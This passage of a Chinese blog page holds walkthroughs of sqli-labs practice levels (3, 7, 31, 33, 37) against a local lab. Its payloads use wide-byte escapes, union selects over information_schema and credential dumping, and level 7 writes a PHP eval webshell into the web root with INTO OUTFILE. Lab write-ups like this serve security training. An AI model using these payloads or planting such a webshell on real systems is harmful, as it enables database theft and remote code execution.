<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971516419.png" alt="1584971516419"></p>
<p>查看users，也需要换成16进制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971569225.png" alt="1584971569225"></p>
<p>查看username字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-33&#x2F;?id&#x3D;11111%df\&#39;  union select 1,2,group_concat(username)from users  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3GET%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584971604853.png" alt="1584971604853"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第三十七关POST宽字节" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.369Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/">
        sqli-labs关卡/sqli-labs第三十七关POST宽字节
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="查看登录后的原始界面，页面返回正常。"><a href="#查看登录后的原始界面，页面返回正常。" class="headerlink" title="查看登录后的原始界面，页面返回正常。"></a>查看登录后的原始界面，页面返回正常。</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585020800592.png" alt="1585020800592"></p>
<h4 id="使用单引号查看报错信息，有反斜杠，确定宽字节注入"><a href="#使用单引号查看报错信息，有反斜杠，确定宽字节注入" class="headerlink" title="使用单引号查看报错信息，有反斜杠，确定宽字节注入"></a>使用单引号查看报错信息，有反斜杠，确定宽字节注入</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585020848241.png" alt="1585020848241"></p>
<h4 id="宽字节注入使用-df加反斜杠"><a href="#宽字节注入使用-df加反斜杠" class="headerlink" title="宽字节注入使用%df加反斜杠\"></a>宽字节注入使用%df加反斜杠\</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;    &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585020912640.png" alt="1585020912640"></p>
<h4 id="使用注释符注释并用order-by-查询字段数，字段3错误"><a href="#使用注释符注释并用order-by-查询字段数，字段3错误" class="headerlink" title="使用注释符注释并用order by  查询字段数，字段3错误"></a>使用注释符注释并用order by  查询字段数，字段3错误</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  order by 3  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021051439.png" alt="1585021051439"></p>
<h4 id="查看字段2，字段2正确"><a href="#查看字段2，字段2正确" class="headerlink" title="查看字段2，字段2正确"></a>查看字段2，字段2正确</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021076357.png" alt="1585021076357"></p>
<h4 id="查看注入点"><a href="#查看注入点" class="headerlink" title="查看注入点"></a>查看注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,2  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021105937.png" alt="1585021105937"></p>
<h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021135993.png" alt="1585021135993"></p>
<h4 id="查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制"><a href="#查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制" class="headerlink" title="查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制"></a>查看表名，因为宽字节注入，需要使用16进制，将库名改为16进制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;0x7365637572697479  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021224985.png" alt="1585021224985"></p>
<h4 id="查看users表，也需要改为16进制"><a href="#查看users表，也需要改为16进制" class="headerlink" title="查看users表，也需要改为16进制"></a>查看users表，也需要改为16进制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;0x7573657273  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021276654.png" alt="1585021276654"></p>
<h4 id="查看username字段"><a href="#查看username字段" class="headerlink" title="查看username字段"></a>查看username字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df\&#39;  union select 1,group_concat(username)from users #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3POST%E5%AE%BD%E5%AD%97%E8%8A%82/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585021309242.png" alt="1585021309242"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第三十一关JSP环境联合" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.367Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/">
        sqli-labs关卡/sqli-labs第三十一关JSP环境联合
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>查看源码，发现只是在双引号的基础上加上了括号。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962946207.png" alt="1584962946207"></p>
<p>在网页中尝试，页面回显正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963054395.png" alt="1584963054395"></p>
<p>查看当前字段数，字段数为3的时候返回正常，为4的时候返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963094698.png" alt="1584963094698"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963106589.png" alt="1584963106589"></p>
<p>查看注入点</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963190594.png" alt="1584963190594"></p>
<p>查看当前数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963213201.png" alt="1584963213201"></p>
<p>查看数据下的表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963252775.png" alt="1584963252775"></p>
<p>查看users表下的字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963287883.png" alt="1584963287883"></p>
<p>查看username字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584963314282.png" alt="1584963314282"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第三关GET联合" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.365Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/">
        sqli-labs关卡/sqli-labs第三关GET联合
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前是否存在sql注入，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327519338.png" alt="1584327519338"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们发现报错了，报错内容里显示引号后面有一个括号，加上括号试试记住因为加上引号了还要注释一下</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) --+</span><br><span class="line">返回正确，然后我们来查看字段数</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327620007.png" alt="1584327620007"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库字段数</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3 --+</span><br><span class="line">order by 3为正确，我们再来试试4</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 4 --+</span><br><span class="line">4错误说明当前字段为3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327700205.png" alt="1584327700205"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327733997.png" alt="1584327733997"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,database() --+</span><br><span class="line">这里在id&#x3D;1的地方加上一个负号，报错显示，如果不使用报错显示只会显示一个内容，</span><br><span class="line">我们看到了当前数据库是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327789577.png" alt="1584327789577"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们查看security数据库下有什么表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584327934961.png" alt="1584327934961"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现有当前emails，referers，uagents，users，其中users在大部分情况下是存放用户信息的，我们来进行查看一下users表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">当前表下有这么多字段，其中发现有id，username，password字段，我们查看一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584328017309.png" alt="1584328017309"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看id，username，password字段里的数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,group_concat(id,username,password)from users --+</span><br><span class="line">查询到了我们想要的内容</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584328079964.png" alt="1584328079964"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第七关GET盲注" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/" class="article-date">
  	<time datetime="2020-07-25T01:18:02.362Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/">
        sqli-labs关卡/sqli-labs第七关GET盲注
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>我们先进入第七关，这里提示错误说我们没有输入带参数的ID值。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318790283.png" alt="1584318790283"></p>
<p>我们输入?id=1,页面返回了You are in…. Use outfile……</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318897307.png" alt="1584318897307"></p>
<p>上面返回了You are in…. Use outfile……而outfile是mysql里面向系统写入文件的函数，然后我们可以尝试写入一句话木马</p>
<p>在写入木马前，先确定注入点，我们经常使用 ‘  “ ) ] 或者其他组合进行闭合，并且在后面加上 and 1=1–+或and 1=2–+ 进行判断闭合的正确性，例如：如果?id=1* and 1=1–+为真，且?id* and 1=2–+为假，那么*字符串就是有效的闭合符，</p>
<p>经过测试我们发现’))字符串可以闭合</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319473364.png" alt="1584319473364"></p>
<p>然后进行测试字段数，使用order by来测试字段数，我们先尝试输入4，发现返回错误，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319618537.png" alt="1584319618537"></p>
<p>然我在尝试输入3试一下，发现返回正确，我们可以确定当前字段是3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319857727.png" alt="1584319857727"></p>
<p>然后我们插入一个文本试试，发现成功地插入了，虽然显示报错了，但是已经插入了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\test.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322414102.png" alt="1584322414102"></p>
<p>我们可以查看一下，成功地导入了文本</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322775021.png" alt="1584322775021"></p>
<p>我们现在导入一句话木马，发现也是已经存在了一句话木马，已经成功地导入进去了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其中一句话木马两边的单引号必须加不然无法导入</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;123&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\test.php&quot;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323522741.png" alt="1584323522741"></p>
<p>我们查看一下php文本里面是否有我们写入的一句话木马，可以发现我们插入的一句话木马已经存在了，虽然没有显示出来，但确实存在了，我们打开php文件看一下</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323835292.png" alt="1584323835292"></p>
<p>发现确实导入了一句话木马，select……into outfile “地址”的方式插入了一句话木马到服务器，这一用法在我们实战环节中经常会用到。 </p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323882223.png" alt="1584323882223"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqli-labs关卡/sqli-labs第一关GET联合" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
